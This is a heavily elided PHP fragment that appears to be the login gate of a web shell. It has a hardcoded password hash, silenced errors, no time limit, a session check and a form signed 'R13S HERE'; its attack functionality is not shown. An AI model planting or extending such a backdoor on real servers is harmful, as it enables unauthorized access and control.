<?php
$password = '3bd97cc745eff1ac0b46a1288ec80739';
error_reporting(0);
set_time_limit(0);
...
if (!$_SESSION['loggedIn']): ?>
    ...
    <form method="post">
        ...
        <p style="font-size: 13px" color="red"> R13S HERE </p>
    </form>
    </body>
    </html>
